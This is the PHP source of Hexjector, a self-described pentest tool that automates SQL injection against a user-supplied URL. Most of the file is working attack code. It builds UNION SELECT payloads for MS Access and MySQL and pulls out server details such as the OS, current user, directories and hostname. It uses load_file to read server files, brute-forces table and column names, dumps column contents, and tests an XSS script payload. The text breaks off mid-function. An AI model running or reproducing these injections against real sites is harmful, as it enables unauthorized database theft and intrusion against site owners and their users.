<?php

/*

	Hexjector is an Opensource,Cross Platform PHP script to automate site
	Pentest for SQL Injection Vulnerabilties.

	Copyright (C) 2010  Hexon

    This Program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.

	*/
	
	
/*

Custom Header Section

*/

/*setcookie('Cookieinject','<script>alert("Hexjector")</script>');*/
header("Cookie-Inject: <script>alert('Hexjector')</script>");
header("Referrer: http://Hexjector/");
header("User-Agent: Hexjector SE");


?>



<?php

/*

Disclaimer
----------

I,Hexon,will not be responsible for any actions that has been done 
by anyone with the usage of this tool. This tool is made AS IT IS for the usage
of Penetration Testing (Pentesting) usage with permission from the site owner.

*/

?>



<?php

//update();

$Hexjector_Version = "hackday;

echo '
<title>
Hexjector ',$Hexjector_Version , ' - The Wrath of Six Injectors
</title>
';

echo '
<head>
<body background="Hex1.jpg"></body>

<style type="text/css">
<!--body {background-color: black}-->
<!-- body {color : gold} -->
<!--body {color : black}-->
body {color : white}
h2 {color : white}
</style>

</head>
';

echo '<h3><b>Hexjector ',$Hexjector_Version,'</b> - The Wrath of Six Injectors</h3>';

echo '
<form action="" method="get" style="color: white" />
<b>Site </b>
<br />
<input type="text" name="site" size="127" value="" />
<br />
<input type="submit" name="injsubmit" />
<br />
<b>Custom Front Parameter</b>
<input type="text" name="custom_front_parameter" size="50" value="" />
<br />
<b>Custom Back Parameter</b>
<input type="text" name="custom_back_parameter" size="50" value="" />
<br />
</form>
';

checkcURL();

error_reporting(E_ALL & ~E_NOTICE);

set_time_limit(3600);

ob_implicit_flush(true);

if(include("Information.php"))
{}
else
{
die("Information.php -- Not Found.");
}

if(include("Con_Url_WD.php"))
{}
else
{
die("Con_Url_WD.php -- Not Found");
}

if(include("Url_Con_Header_WD.php"))
{}
else
{
die("Url_Con_Header_WD.php -- Not Found");
}

if(include("WAF_Detector.php"))
{}
else
{
die("WAF_Detector.php -- Not Found");
}

function checkcURL()
{
if(function_exists('curl_init'))
{
/*echo "cURL Status=[OK]","<br />";*/
}
else
{
die("No cURL Support");
}
}

function update()
{
$Hexjector_Version = "v1.0.7.4";

include("Update_Con.php");

if(preg_match("/-!(.*?)!-/",get_url_update("http://hexjector.sourceforge.net/update.php"),$versionmatch))
{
if($versionmatch[1]==$Hexjector_Version)
{
}
else
{
echo "<script>alert('$versionmatch[1] is Out, Please download it at https://sourceforge.net/hexjector/files')</script>";
}
}
else
{
echo "Cannot Find Version, either site is down or I have changed the site.";
}
}

function MsAccess_SQL_Injection($url2)
{
$whitespace = "%00";

if($_GET['custom_front_parameter']!=null)
{
$paramremspc = str_replace(" ",$whitespace,$_GET['custom_front_parameter']);
$param = $paramremspc;
}


if($_GET['custom_back_parameter']!=null)
{
$paramremspc = str_replace(" ",$whitespace,$_GET['custom_back_parameter']);
if(preg_match("/null/i",$_GET['custom_back_parameter']))
{
$comment[$rancom] = "";
}
else
{
$comment[$rancom] = $paramremspc;
}
}

$o_urlx = "/*! <b> URL </b> = < ". htmlspecialchars($url2,ENT_QUOTES) ." > */"."<br />";
echo "<br />","<b>Server Data Extraction</b>","<br />",$o_urlx;

/*

cURL Availability Checking

*/

/*

Column Number Enumeration

*/

$hex = "chr(104)%2bchr(51)%2bchr(120)2bchr(106)%2bchr(51)%2bchr(99)%2bchr(116)%2bchr(48)%2bchr(114),";

for($loop=$loopstart;$loop<=$loopend;++$loop)
{
if($loop===1)
{
$injurl = $param . $whitespace . $unisel . $whitespace . "chr(104)%2bchr(51)%2bchr(120)2bchr(106)%2bchr(51)%2bchr(99)%2bchr(116)%2bchr(48)%2bchr(114)" . $comment[$rancom];
}
else
{
$injurl = $param . $whitespace . $unisel . $whitespace . $hex . $remspc . $comment[$rancom];
}
$continue = str_repeat($hex,$loop);
$remspc = substr_replace($continue ,"",-1);

$hexon = str_replace($strsearch,$injurl,"hexon");

$newurl = $url2 . $injurl;

if(preg_match("/h3xj3ct0r|0x6833786a3363743072/i",geturl($newurl),$found))
{
$o_ccol = "/*! <b> Column Count</b> = $loop  */"."<br />";
echo $o_ccol;
$column_count = true;
break;
}
else
{
$column_count = false;
}
}
if($column_count == false)
{
exit("<b>Column Count Enumeration Failed</b>");
}


/*

String Column Enumeration

*/


if($column_count==true)
{
$struct=1;
for($struct;$struct<=$loop;++$struct)
{
static $gen;
$gen.=$struct.",";
}
$bcols = substr_replace($gen,"",-1);

$cols=1;

for($cols;$cols<=$loop;++$cols)
{
$strcolumn = "0x2D217E6865786F6E7E212D";
$xstrcheck = str_replace($cols,$strcolumn,$bcols);
$strurl = $url2 . $param . $whitespace . $unisel . $whitespace . $xstrcheck . $comment[$rancom];


if(preg_match("/-!~hexon~!-(.*?)/is",geturl($strurl),$found2))
{
$o_strcol = "/*! <b> String column </b> = ".$cols." */<br />";
echo $o_strcol;
$str_col = true;
break;
}
else
{
$str_col = false;
}
}
}
else
{
$o_strcolf = "/*! "."<br />"."<b>Column Count Enumeration Failed</b> */"."<br />";
echo $o_strcolf;
die($o_strcolf);
}

if($str_col == true)
{
$webrootquery = "MsAccess_SQL_Injection from Hexjector.Hkhexon";
$wrootquery = str_replace(" ",$whitespace,$webrootquery);
$getwebroot = str_replace($cols,$wrootquery,$bcols);

$webrootlk =  $url2 . $param . $whitespace . $unisel . $whitespace . $getwebroot .$comment[$rancom];

if(preg_match("/h3x:(.*?):h3x/s",geturl($webrootlk),$foundwebroot))
{
$o_webroot = "/*! <b>Webroot</b> = ".$foundwebroot[1] ." */<br />";
echo $o_webroot;
}
else
{
$version_compile_os = false;
$o_version_compile_osf = "/*! <b>Operating System</b> Enumeration Failed */"."<br />";
echo $o_version_compile_osf;
$o_version_compile_os = null;
}
}
echo "<b>Tables</b> :" , "<br />";
$filename = "tables.txt";
$handle = fopen($filename, "r");
$contents = fread($handle, filesize($filename));
$v4table = preg_split("[\s]",$contents,null,PREG_SPLIT_NO_EMPTY);
fclose($handle);

foreach ($v4table as $tablev4)
{
$tabv4query = "(SELECT 0x6833783a%2b%2b3a683378 from $tablev4)";
$tablev4query = str_replace(" ",$whitespace,$tabv4query);
$v44col = str_replace($cols,$tablev4query,$bcols);

$v4curl = $site . $param . $whitespace . $unisel . $whitespace . $v44col . $comment[$rancom];

if(preg_match("/h3x:(.*?):h3x/s",geturl($v4curl),$v4tablefound))
{
echo "<b>",htmlspecialchars($tablev4,ENT_QUOTES),"</b>", "<br />";
$table_v4_found[] = $tablev4;
//$txtdumpv4=true;
$Table_F=true;
}
else
{}
}
if($Table_F==true)
{
}
else
{
echo "Table Bruteforce Failed","<br />";
$Table_F=false;
}

/*

Column Name Bruteforce

*/
/**/
if($Table_F==true)
{
/**/
/**/
/*$v4columnlist = */
$filename = "column.txt";
$handle = fopen($filename, "r");
$contents = fread($handle, filesize($filename));
$v4columnlist = preg_split("[\s]",$contents,null,PREG_SPLIT_NO_EMPTY);
fclose($handle);

foreach($table_v4_found as $Table_v4)
{
foreach ($v4columnlist as $v4column)
{
/*echo "v4column = " , $v4column , "<br />";*/
$coluv4query = "(SELECT concat(CHAR(104,51,120,58),group_concat($v4column),CHAR(58,104,51,120)) from $Table_v4)";
$columnv4query = str_replace(" ",$whitespace,$coluv4query);
$v44col = str_replace($cols,$columnv4query,$bcols);

$v4curl = $site . $param . $whitespace . $unisel . $whitespace . $v44col. $comment[$rancom];
/*echo $v4curl , "<br />";*/
if(preg_match("/h3x:(.*?):h3x/s",geturl($v4curl),$v4columnfound))
{
$o_v4col = "<br />"."<b>".$Table_v4.".".$v4column."</b>"." -> "."<b>".$v4columnfound[1]."</b>";
echo $o_v4col,"<br />";
/*$txtdumpv4=true;*/
}
else
{
/*wafdetect($v4curl);*/
}
}
}

}

if($Table_F==true)
{
echo '
<b>Hexacurd</b> -- <b>Current Directory Finder</b>
<br />
<form action="HexaCurD.php" method="post" />
<b>Url</b>
<br />
<input type="text" name="url" size="127" value=http://localhost/file.php?param=value union select 1,hexon,3,4,5 from table />
<br />

<input type="submit" name="curdsubmit" />
<br />
</form>
';

}

}



function MySQL_Injection($url2)
{
include("Information.php");

$error = array("","1337",'"omghexjectorishere',"%20and%201337=1337","'%20and%20'hexon'='hexjector","'%20and%20'hexon'='hexon","%20and%201337=31337","");
for($err=0;$err<=6;$err++)
{
$urlerror = $url2 . $error[$err];
//echo $urlerror , "<br />";
/*echo htmlspecialchars($urlerror,ENT_QUOTES) , "<br />";*/
$init = curl_init();
curl_setopt($init,CURLOPT_URL,$urlerror);
curl_setopt($init,CURLOPT_FRESH_CONNECT,True);
curl_setopt($init,CURLOPT_FORBID_REUSE,True);
curl_setopt($init,CURLOPT_RETURNTRANSFER,1);
if($exec = curl_exec($init))
{
if($err==0)
{
$data = curl_getinfo($init);
$http0 = $data["size_download"];
//echo "http0 = ",$http0,"<br />";
}

if($err==1)
{
$info = curl_getinfo($init);
$http1 = $info["size_download"];
//echo "http1 = ",$http1,"<br />";
}

if($err==2)
{
$info = curl_getinfo($init);
$http2 = $info["size_download"];
//echo "http2 = ",$http2,"<br />";
}

if($err==3)
{
$info = curl_getinfo($init);
$http3 = $info["size_download"];
//echo "http3 = ",$http3,"<br />";
if($http3==$http0)
{
$num_sqlt = true;
//echo "numsqlt = true","<br />";
}
else
{
$num_sqlt = false;
}
}
if($err==4)
{
$info = curl_getinfo($init);
$http4 = $info["size_download"];
//echo "http4 = ",$http4,"<br />";
if($http4 == $http1 or $http4 == $http2)
{
$str_sqli_f = true;
}
else
{
$str_sqli_f = false;
}
}
if($err==5)
{
$info = curl_getinfo($init);
$http5 = $info["size_download"];
//echo "http5 = ",$http5,"<br />";
if($http5 == $http0)
{
$str_sqli_t = true;
}
else
{
$str_sqli = false;
}
if($err==6)
{
$info = curl_getinfo($init);
$http6 = $info["size_download"];
//echo "http6 = ",$http6, "<br />";
if($http6 == $http1 or $http6 ==  $http2)
{
$num_sqlf = true;
}
else
{
$num_sqlf = false;
}
}
// Cannot echo or return
}
else if(!$exec)
{}
/*else
{
echo "Connection to site Failed2","<br />";
$str_sqli = false;
}*/
curl_close($init);
}
}
//echo "str_sqli_f = ",$str_sqli_f;
//echo "str_sqli_t = ",$str_sqli_t;
if($str_sqli_f == true && $str_sqli_t == true)
{
$str_sqli = true;
}
else if($num_sqlf == true && $num_sqlt == true)
{}
else
{}


if($str_sqli == true)
{
$param = "'".$param;
$comment[$rancom] = "/**/and/**/0x3F='0x3F/**/";
}
else if($str_sqli==false)
{}

if($_GET['custom_front_parameter']!=null)
{
$paramremspc = str_replace(" ",$whitespace,$_GET['custom_front_parameter']);
$param = $paramremspc;
}


if($_GET['custom_back_parameter']!=null)
{
$paramremspc = str_replace(" ",$whitespace,$_GET['custom_back_parameter']);
if(preg_match("/null/i",$_GET['custom_back_parameter']))
{
$comment[$rancom] = "";
}
else
{
$comment[$rancom] = $paramremspc;
}
}

$o_urlx = "/*! <b> URL </b> = < ". htmlspecialchars($url2,ENT_QUOTES) ." > */"."<br />";
echo "<br />","<b>Server Data Extraction</b>","<br />",$o_urlx;

/*

cURL Availability Checking

*/

/*

Column Number Enumeration

*/

for($loop=$loopstart;$loop<=$loopend;++$loop)
{
if($loop===1)
{
$injurl = $param . $whitespace . $unisel . $whitespace . "0x6833786a3363743072" . $comment[$rancom];
}
else
{
$injurl = $param . $whitespace . $unisel . $whitespace . $hex . $remspc . $comment[$rancom];
}
$continue = str_repeat($hex,$loop);
$remspc = substr_replace($continue ,"",-1);

$hexon = str_replace($strsearch,$injurl,"hexon");

$newurl = $url2 . $injurl;

if(preg_match("/h3xj3ct0r/i",geturl($newurl),$found))
{
$o_ccol = "/*! <b> Column Count</b> = $loop  */"."<br />";
echo $o_ccol;

$column_count = true;
break;
}
else
{
$column_count = false;
}
}
if($column_count == false)
{
exit("<b>Column Count Enumeration Failed</b>");
}


/*

String Column Enumeration

*/


if($column_count==true)
{
$struct=1;
for($struct;$struct<=$loop;++$struct)
{
static $gen;
$gen.=$struct.",";
}
$bcols = substr_replace($gen,"",-1);

$cols=1;

for($cols;$cols<=$loop;++$cols)
{
$strcolumn = "0x2D217E6865786F6E7E212D";
$xstrcheck = str_replace($cols,$strcolumn,$bcols);
$strurl = $url2 . $param . $whitespace . $unisel . $whitespace . $xstrcheck . $comment[$rancom];


if(preg_match("/-!~hexon~!-(.*?)/is",geturl($strurl),$found2))
{
$o_strcol = "/*! <b> String column </b> = ".$cols." */<br />";
echo $o_strcol;
$str_col = true;
break;
}
else
{
$str_col = false;
}
}
}
else
{
$o_strcolf = "/*! "."<br />"."<b>Column Count Enumeration Failed</b> */"."<br />";
echo $o_strcolf;
}

/*

Operrating System Enumeration

*/

if($str_col == true)
{
$version_compile_osquery = "concat(CHAR(104,51,120,58),cast(@@veRsIOn_cOMPIle_Os as char),CHAR(58,104,51,120))";
$v_com_osquery = str_replace(" ",$whitespace,$version_compile_osquery);
$getversion_compile_os = str_replace($cols,$v_com_osquery,$bcols);

$version_compile_oslk =  $url2 . $param . $whitespace . $unisel . $whitespace . $getversion_compile_os .$comment[$rancom];


if(preg_match("/h3x:(.*?):h3x/s",geturl($version_compile_oslk),$foundversion_compile_oslk))
{
$o_version_compile_os = "/*! <b>Operating System</b> = ".$foundversion_compile_oslk[1] ." */<br />";
echo $o_version_compile_os;
$fndversion_compile_os = $foundversion_compile_oslk[0];
$version_compile_os = true;
$o_version_compile_osf = null;
}
else
{
$version_compile_os = false;
$o_version_compile_osf = "/*! <b>Operating System</b> Enumeration Failed */"."<br />";
echo $o_version_compile_osf;
$o_version_compile_os = null;
}
}




/*

Operating System Architecture Enumeration

*/

if($str_col == true)
{
$version_compile_machinequery = "concat(CHAR(104,51,120,58),cast(@@vERSion_cOMPIle_maCHIne as char),CHAR(58,104,51,120))";
$v_comp_macquery = str_replace(" ",$whitespace,$version_compile_machinequery);
$getv_comp_macquery = str_replace($cols,$v_comp_macquery,$bcols);

$version_compile_machinelk =  $url2 . $param . $whitespace . $unisel . $whitespace . $getv_comp_macquery .$comment[$rancom];


if(preg_match("/h3x:(.*?):h3x/s",geturl($version_compile_machinelk),$foundversion_compile_machinelk))
{
$o_version_compile_machine = "/*! <b>Operating System Architecture </b> = ".$foundversion_compile_machinelk[1] ." */<br />";
echo $o_version_compile_machine;
$fndversion_compile_machine = $foundversion_compile_machinelk[1];
$version_compile_machine = true;
$o_version_compile_machinef = null;
}
else
{
$o_version_compile_machinef = "/*! <b>Operating System Architecture</b> Enumeration Failed */"."<br />";
echo $o_version_compile_machinef;
$version_compile_machine = null;
}
}


/*

User Enumeration

*/

if($str_col == true)
{
$userquery = "concat(CHAR(104,51,120,58),cast(current_user as char),CHAR(58,104,51,120))";
$usrquery = str_replace(" ",$whitespace,$userquery);
$getusr = str_replace($cols,$usrquery,$bcols);

$usrlk =  $url2 . $param . $whitespace . $unisel . $whitespace . $getusr .$comment[$rancom];

if(preg_match("/h3x:(.*?):h3x/s",geturl($usrlk),$foundusr))
{
$o_usr = "/*! <b>Current User</b> = ".$foundusr[1]." */<br />";
echo $o_usr;
$usr = $foundusr[1];
$usr = true;
}
else
{
$o_usrf = "/*! <b>User</b> Enumeration Failed */"."<br />";
echo $o_usrf;
}
}
/*

Basedir Enumeration

*/

if($str_col == true)
{
$basedirquery = "concat(CHAR(104,51,120,58),cast(@@basedir as char),CHAR(58,104,51,120))";
$bdirquery = str_replace(" ",$whitespace,$basedirquery);
$getbasedir = str_replace($cols,$bdirquery,$bcols);

$basedirlk =  $url2 . $param . $whitespace . $unisel . $whitespace . $getbasedir .$comment[$rancom];

if(preg_match("/h3x:(.*?):h3x/s",geturl($basedirlk),$foundbasedir))
{
$o_basedir = "/*! <b>Basedir</b> = ".$foundbasedir[1]. " */<br />";
echo $o_basedir;
$fndbasedir = $foundbasedir[1];
$basedir = true;
$o_basedirf = null;
}
else
{
$o_basedirf = "/*! <b>Basedir</b> Enumeration Failed */"."<br />";
echo $o_basedirf;
$basedir = null;
$o_basedir = null;
}
}

/*

Datadir Enumeration

*/

if($str_col == true)
{
$datadirquery = "concat(CHAR(104,51,120,58),cast(@@dAtAdIr as char),CHAR(58,104,51,120))";
$ddirquery = str_replace(" ",$whitespace,$datadirquery);
$getdatadir = str_replace($cols,$ddirquery,$bcols);

$datadirlk =  $url2 . $param . $whitespace . $unisel . $whitespace . $getdatadir .$comment[$rancom];


if(preg_match("/h3x:(.*?):h3x/s",geturl($datadirlk),$founddatadir))
{
$o_datadir = "/*! <b>Datadir</b> = ".$founddatadir[1] ." */<br />";
echo $o_datadir;
$fnddatadir = $founddatadir[1];
$datadir = true;
$o_datadirf = null;
}
else
{
$o_datadirf = "/*! <b>Datadir</b> Enumeration Failed */"."<br />";
echo $o_datadirf;
$datadir = null;
}
}

/*

Tempdir Enumeration

*/

if($str_col == true)
{
$tempdirquery = "concat(CHAR(104,51,120,58),cast(@@tmPdIr as char),CHAR(58,104,51,120))";
$tdirquery = str_replace(" ",$whitespace,$tempdirquery);
$gettempdir = str_replace($cols,$tdirquery,$bcols);

$tempdirlk =  $url2 . $param . $whitespace . $unisel . $whitespace . $gettempdir .$comment[$rancom];


if(preg_match("/h3x:(.*?):h3x/s",geturl($tempdirlk),$foundtempdir))
{
$o_tempdir = "/*! <b>Tempdir</b> = ".$foundtempdir[1] ." */<br />";
echo $o_tempdir;
$fndtempdir = $foundtempdir[1];
$tempdir = true;
$o_tempdirf = null;
}
else
{
$o_tempdirf = "/*! <b>Tempdir</b> Enumeration Failed */"."<br />";
echo $o_tempdirf;
$tempdir = null;
}
}


/*

Hostname Enumeration

*/

if($str_col == true)
{
$hostnamequery ="concat(CHAR(104,51,120,58),cast(@@hoSTnaMe as char),CHAR(58,104,51,120))";
$hnamequery = str_replace(" ",$whitespace,$hostnamequery);
$gethostname = str_replace($cols,$hnamequery,$bcols);

$hostnameret =  $url2 . $param . $whitespace . $unisel . $whitespace . $gethostname .$comment[$rancom];

if(preg_match("/h3x:(.*?):h3x/s",geturl($hostnameret),$foundhostname))
{
$o_hostname = "/*! <b>Hostname</b> = ".$foundhostname[1]." */<br />";
echo $o_hostname;
$fndhostname = $foundhostname[1];
$hostname = true;
$o_hostnamef = null;
}
else
{
$o_hostnamef = "/*! <b>Hostname</b> Enumeration Failed */"."<br />";
echo $o_hostnamef;
$hostname = null;
}
}


/*

Database Enumeration

*/

if($str_col == true)
{
$databasequery = "concat(CHAR(104,51,120,58),cast(database() as char),CHAR(58,104,51,120))";
$dquery = str_replace(" ",$whitespace,$databasequery);
$getdb = str_replace($cols,$dquery,$bcols);

$urk = $url2 . $param . $whitespace . $unisel . $whitespace . $getdb .$comment[$rancom];

if(preg_match("/h3x:(.*?):h3x/s",geturl($urk),$foundd2))
{
$o_db = "/*! <b>Primary Database Name</b> = ".$foundd2[1]." */<br />";
echo $o_db;
$db = true;
$o_dbf = null;
}
else
{
$o_dbf = "/*! <b>Database</b> Enumeration Failed */"."<br />";
echo $o_dbf;
$db = null;
}
}

/*

Version Comment Enumeration

*/


if($str_col == true)
{
$version_commentquery = "concat(CHAR(104,51,120,58),cast(@@veRsIOn_cOMMeNt as char),CHAR(58,104,51,120))";
$v_commentquery = str_replace(" ",$whitespace,$version_commentquery);
$getv_commdir = str_replace($cols,$v_commentquery,$bcols);

$version_commentdirlk =  $url2 . $param . $whitespace . $unisel . $whitespace . $getv_commdir .$comment[$rancom];


if(preg_match("/h3x:(.*?):h3x/s",geturl($version_commentdirlk),$foundversion_commentdirlk))
{
$o_version_comment = "/*! <b>Version Comment</b> = ".$foundversion_commentdirlk[1] ." */<br />";
echo $o_version_comment;
$fndversion_comment = $foundversion_commentdirlk[1];
$version_comment = true;
$o_version_commentf = null;
}
else
{
$o_version_commentf = "/*! <b>Version Comment</b> Enumeration Failed */"."<br />";
echo $o_version_commentf;
$version_comment = null;
}
}

/*

MySQL Version Number Enumeration

*/

if($str_col == true)
{
$versionquery = "concat(CHAR(104,51,120,58),cast(version() as char),CHAR(58,104,51,120))";
$vquery = str_replace(" ",$whitespace,$versionquery);
$getver = str_replace($cols,$vquery,$bcols);
$verl =  $url2 . $param . $whitespace . $unisel . $whitespace . $getver .$comment[$rancom];

if(preg_match("/h3x:(.*?):h3x/s",geturl($verl),$foundver))
{
$o_sqlv = "/*! <b>MySQL Version</b> = ".$foundver[1] ." */<br />";
echo $o_sqlv;

if(preg_match("/5./",$foundver[1]))
{
$sqliv5=5; 
$sqliv4=null; 
$Table_F = null;
$o_sqlv5 = "/*! <b>MySQL Version v5</b> */"."<br />";
echo $o_sqlv5;
$o_sqlv4 = null;
$o_sqlv3 = null;
$o_sqlv_unk = null;
}
else if(preg_match("/4./",$foundver[1]))
{
$sqliv4=4;
$sqliv5 = false;
$o_sqlv4 = "/*! <b>MySQL Version v4</b> */"."<br />";
echo $o_sqlv4;
$o_sqlv5 = null;
$o_sqlv3 = null;
$o_sqlv_unk = null;
}
else if(preg_match("/3./",$foundver[1]))
{
$o_sqlv3 = "/*! <b>MySQL Version v3</b> */"."<br />";
echo $o_sqlv3;
$sqliv3=3;
$sqliv4 = false;
$sqliv5 = false;
$o_sqlv4 = null;
$o_sqlv5 = null;
$o_sqlv_unk = null;
}
else
{
$o_sqlv_unk = "/*! <b>MySQL Version uNk</b> */"."<br />";
echo $o_sqlv_unk;
$sqli="uNk";
$o_sqlv5 = null;
$o_sqlv4 = null;
$o_sqlv3 = null;
}

/*

MySQL Version Enumeration (Beta)

*/

if($sqliv5 ==5 and $hostname == true and $datadir==true)
{
$slash = "/";
$backslash = "\\";
$bomdatadir = str_replace($backslash,$slash,$fnddatadir);
echo "/*! <b>Version Extraction : (Experimental)</b> */","<br />";

$wdata = $bomdatadir .$fndhostname . '.err';

$ver_load = "load_file(0x".bin2hex($wdata).")";

$getverx = str_replace($cols,"concat(CHAR(104,51,120,58),$ver_load,CHAR(58,104,51,120))",$bcols);
$loadv =  $url2 . $param . $whitespace . $unisel . $whitespace . $getverx .$comment[$rancom];
if(preg_match("/Version: '(.*?)'/si",geturl($loadv),$loadversion))
{
$o_sqlv_beta = "/*! <b>Version of MySQL Database</b> = ".$loadversion[1]." */<br />";
echo $o_sqlv_beta;
}
else
{
$o_sqlv_beta = null;
$o_sqlv_betaf = null;
} 
}
else
{
$o_sqlv_betaf = "<br />"."/*! <b>Version(Beta) Enumeration Failed</b> */"."<br />";
echo $o_sqlv_betaf;
$o_sqlv_beta = null;
}
}
}

/*

MySQL Injection (Version 4.xx)

*/

/*

Table Name Bruteforce

*/


if($sqliv4==4)  
{
echo "<br />","<b>MySQL Injection v4 Enumeration</b>","<br />";
echo "<b>Tables</b> :" , "<br />";
$filename = "tables.txt";
$handle = fopen($filename, "r");
$contents = fread($handle, filesize($filename));
$v4table = preg_split("[\s]",$contents,null,PREG_SPLIT_NO_EMPTY);
fclose($handle);

foreach ($v4table as $tablev4)
{
$tabv4query = "(SELECT concat(CHAR(104,51,120,58),count(1337),CHAR(58,104,51,120)) from $tablev4)";
$tablev4query = str_replace(" ",$whitespace,$tabv4query);
$v44col = str_replace($cols,$tablev4query,$bcols);

$v4curl = $site . $param . $whitespace . $unisel . $whitespace . $v44col . $comment[$rancom];

if(preg_match("/h3x:(.*?):h3x/s",geturl($v4curl),$v4tablefound))
{
echo "<b>",htmlspecialchars($tablev4,ENT_QUOTES),"</b>", "<br />";
$table_v4_found[] = $tablev4;
//$txtdumpv4=true;
$Table_F=true;
}
else
{}
}
if($Table_F==true)
{
}
else
{
echo "Table Bruteforce Failed","<br />";
$Table_F=false;
}
}

/*

Column Name Bruteforce

*/
/**/
if($Table_F==true)
{
/**/
/**/
/*$v4columnlist = */
$filename = "column.txt";
$handle = fopen($filename, "r");
$contents = fread($handle, filesize($filename));
$v4columnlist = preg_split("[\s]",$contents,null,PREG_SPLIT_NO_EMPTY);
fclose($handle);

foreach($table_v4_found as $Table_v4)
{
foreach ($v4columnlist as $v4column)
{
/*echo "v4column = " , $v4column , "<br />";*/
$coluv4query = "(SELECT concat(CHAR(104,51,120,58),group_concat($v4column),CHAR(58,104,51,120)) from $Table_v4)";
$columnv4query = str_replace(" ",$whitespace,$coluv4query);
$v44col = str_replace($cols,$columnv4query,$bcols);

$v4curl = $site . $param . $whitespace . $unisel . $whitespace . $v44col. $comment[$rancom];
/*echo $v4curl , "<br />";*/
if(preg_match("/h3x:(.*?):h3x/s",geturl($v4curl),$v4columnfound))
{
$o_v4col = "<br />"."<b>".$Table_v4.".".$v4column."</b>"." -> "."<b>".$v4columnfound[1]."</b>";
echo $o_v4col,"<br />";
/*$txtdumpv4=true;*/
}
else
{
/*wafdetect($v4curl);*/
}
}
}
}

/**/
/**/
/*

Dump Function V4

*/
/*
if($txtdumpv4=true)
{

$datav4 = $o_v4table . $o_v4col;

$dir = getcwd() . "/DumpV4";
if(!$dir)
{
mkdir($dir,700);
}
chdir($dir);
$md4 = "[HexDV4]".md5($datav4).'.html';

$open = fopen($md4,"a+");
fwrite($open,$datav4);
fclose($open);


echo "<br />","File is saved as <a href=DumpV4/",$md4,">",$md4,"</a><br />";
}
*/



/*

Schema Count Enumeration

*/

if($sqliv5==5)
{
$schemacountquery = "(Select aLl concat(CHAR(104,51,120,58),count(schema_name),CHAR(58,104,51,120)) from information_schema.schemata)";
$sch = str_replace($cols,$schemacountquery,$bcols);
$schema = str_replace(" ",$whitespace,$sch);
$schemacount =  $url2 . $param . $whitespace . $unisel . $whitespace . $schema .$comment[$rancom];

if(preg_match("/h3x:(.*?):h3x/s",geturl($schemacount),$foundschemacount))
{
$o_schemacnt = "/*! <b>Schema Count</b> = ". $foundschemacount[1] . " */<br />";
echo $o_schemacnt;
$o_schemacntf = null;
}
else
{
$o_schemacntf = "<br />"."<b>Schema Count</b> Enumeration Failed" . "<br />";
echo $o_schemacntf;
$o_schemacnt = null;
$foundschemacount[1] = null;
}
}

/*

SiXSS -- SQL Injection XSS

*/

if($str_col == true)
{
echo "<br />","<b>SiXSS Test</b>","<br />";

$sixss_str = bin2hex('<SCrIPt>alert("h3xj3ct0r")</scRipT>');
$SiXSS_query = "0x".$sixss_str;
$Get_Si_XSS = str_replace($cols,$SiXSS_query,$bcols);

$Si_XSSlk =  $url2 . $param . $whitespace . $unisel . $whitespace . $Get_Si_XSS .$comment[$rancom];

if(preg_match("/h3xj3ct0r/is",geturl($Si_XSSlk),$foundSi_XSSlk))
{
$o_SiXSS = "/*! <b>SiXSS Result</b> = True */" ."<br />";
echo $o_SiXSS;
$SiXSS = true;
$o_SiXSSf = null;
}
else
{
$o_SiXSSf = "/*! <b>SiXSS Result</b> = <b>False</b> */" ."<br />";
echo $o_SiXSSf;
$o_SiXSS = null;
}
}



/*

Schema Name Enumeration

*/
if($str_col==true and $sqliv5==5)
{
echo "<br />","<b>MySQL Injection v5 Enumeration</b>","<br />";
$schemastart=0;

for($schemastart;$schemastart<$foundschemacount[1];++$schemastart)
{
{
{
$schemaquery = "(Select aLl concat(CHAR(104,51,120,58),schema_name,CHAR(58,104,51,120)) from information_schema.schemata limit $schemastart,1)";
$sch = str_replace($cols,$schemaquery,$bcols);
$schema = str_replace(" ",$whitespace,$sch);
$schemaname =  $url2 . $param . $whitespace . $unisel . $whitespace . $schema .$comment[$rancom];

if(preg_match("/h3x:(.*?):h3x/s",geturl($schemaname),$foundschemaname))
{
if(preg_match("/information_schema/",geturl($schemaname)))
{
continue;
}

else
{
$o_schema[$schemastart] = "<br />"."Schema Name = <b>". $foundschemaname[1] ."</b>". "<br />";
echo $o_schema[$schemastart];
}
}
else
{
}

/*

Table Count Enumeration

*/


if($db==true and $sqliv5==5)
{
$tablecountv5query = "(Select aLl concat(CHAR(104,51,120,58),count(table_name),CHAR(58,104,51,120)) from information_schema.tables where table_schema=0x".bin2hex($foundschemaname[1]).")";
$tcountv5query = str_replace(" ",$whitespace,$tablecountv5query);
$gettablecnt = str_replace($cols,$tcountv5query,$bcols);
$tablek =  $url2 . $param . $whitespace . $unisel . $whitespace . $gettablecnt .$comment[$rancom];

if(preg_match("/h3x:(.*?):h3x/s",geturl($tablek),$foundtablecount))
{
$o_sch_table = "<b>".$foundschemaname[1]."</b>"." Database -> <b>".$foundtablecount[1]." Tables</b>" . "<br />";
echo $o_sch_table;
}
else
{
$o_sch_tablef = "Table Count Enumeration Failed "."<br />";
echo $o_sch_table;
}

$tablecol = $foundtablecount[1];
}

/*

Table Name Enumeration

*/

if($foundtablecount[1] <= 12)
{
$tablev5query = "(Select aLl concat(concat(CHAR(104,51,120,58)),group_concat(table_name),concat(CHAR(58,104,51,120))) from information_schema.tables where table_schema=0x".bin2hex($foundschemaname[1]).")";
$tv5query = str_replace(" ",$whitespace,$tablev5query);
$gettable = str_replace($cols,$tv5query,$bcols);

$tablev5 =  $url2 . $param . $whitespace . $unisel . $whitespace . $gettable .$comment[$rancom];

if(preg_match("/h3x:(.*?):h3x/s",geturl($tablev5),$foundtable))
{
$tab = $foundtable[1];
$tbom = explode(",",$tab,$tablecol);
$o_schema_table = "<br />"."<b>".$foundschemaname[1]." Table :"."</b>"."<br />";
echo $o_schema_table;
$start=0;
for($start;$start<$tablecol;++$start)
{
$table[$start] = $tbom[$start];
$o_tablename = $foundschemaname[1]."."."<b>".$table[$start]."</b>"."<br />";
echo $o_tablename;
$o_tablenamef = null;
}
$tv5 = true;
}
elseif($foundtablecount[1] === 0)
{
echo $foundschemaname[1] ," = 0 table(s)";
continue;
}
else
{
